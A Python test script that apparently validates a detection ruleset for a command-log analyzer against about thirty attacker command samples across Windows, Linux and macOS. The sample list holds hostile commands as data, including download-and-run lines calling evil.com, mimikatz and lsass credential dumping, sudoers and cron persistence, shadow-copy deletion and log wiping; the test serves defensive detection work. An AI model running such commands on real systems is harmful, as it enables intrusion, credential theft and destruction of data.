"""
Test script to validate the expanded ruleset
"""

import pandas as pd
from log_analyzer import make_analyzer, load_rules
from threat_intel import ThreatIntelligenceProvider

def test_expanded_rules():
    print("🧪 Testing Expanded Ruleset")
    print("="*50)
    
    # Load rules
    rules_data = load_rules("rules.json")
    analyze_command = make_analyzer(rules_data)
    
    # Initialize threat intelligence
    threat_intel_provider = ThreatIntelligenceProvider()
    threat_intel_provider.load_mitre_mappings()
    
    # Test cases for new rules
    test_cases = [
        # Windows tests
        "net user hacker password123 /add",
        "schtasks /create /tn \"Updater\" /tr \"C:\\temp\\malware.exe\" /sc ONSTART",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\temp\\malware.exe\"",
        "powershell -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1')\"",
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
        "vssadmin delete shadows /all /quiet",
        "netsh advfirewall set allprofiles state off",
        "certutil -urlcache -split -f http://evil.com/malware.exe C:\\temp\\malware.exe",
        "procdump.exe -ma lsass.exe C:\\temp\\dump.dmp",
        "mshta http://evil.com/malware.hta",
        
        # Linux tests
        "useradd -m -p '$6$salt$hash' hacker",
        "echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "crontab -l ; echo '0 * * * * /tmp/malware.sh' | crontab -",
        "nmap -sV 192.168.1.0/24",
        "cat /etc/shadow",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "curl -o malware https://evil.com/malware && chmod +x malware && ./malware",
        "systemctl enable malware.service",
        "iptables -F",
        "rm -rf /var/log/*",
        
        # macOS tests
        "dscl . -create /Users/hacker",
        "sudo pmset repeat weekday 3:00 /tmp/malware.sh",
        "system_profiler SPHardwareDataType",
        "security find-internet-password -s evil.com",
        "sudo spctl --master-disable",
        "defaults write /Library/Preferences/com.apple.loginwindow LoginHook /tmp/malware.sh",
        
        # Cross-platform tests
        "docker run --rm -v /:/host alpine chroot /host /bin/bash -c 'echo pwned'",
        "aws ec2 run-instances --image-id ami-12345678",
        "kubectl exec -it pod-name -- /bin/bash",
        "python -c \"import urllib2; exec(urllib2.urlopen('http://evil.com/malware').read())\""
    ]
    
    print(f"Testing {len(test_cases)} command samples...")
    print()
    
    matched_count = 0
    for i, command in enumerate(test_cases, 1):
        result = analyze_command(command)
        if result != "Unknown Activity":
            matched_count += 1
            # Apply threat intelligence enrichment
            enriched_result = threat_intel_provider.enrich_analysis_result(result)
            print(f"{i:2d}. ✓ {command}")
            print(f"    → {enriched_result}")
        else:
            print(f"{i:2d}. ○ {command}")
            print(f"    → {result}")
        print()
    
    print("="*50)
    print(f"SUMMARY: {matched_count}/{len(test_cases)} commands matched ({matched_count/len(test_cases)*100:.1f}%)")
    
    if matched_count == len(test_cases):
        print("🎉 All test cases matched! Ruleset validation successful.")
    else:
        print(f"⚠️  {len(test_cases) - matched_count} commands were not matched by any rule.")

if __name__ == "__main__":
    test_expanded_rules()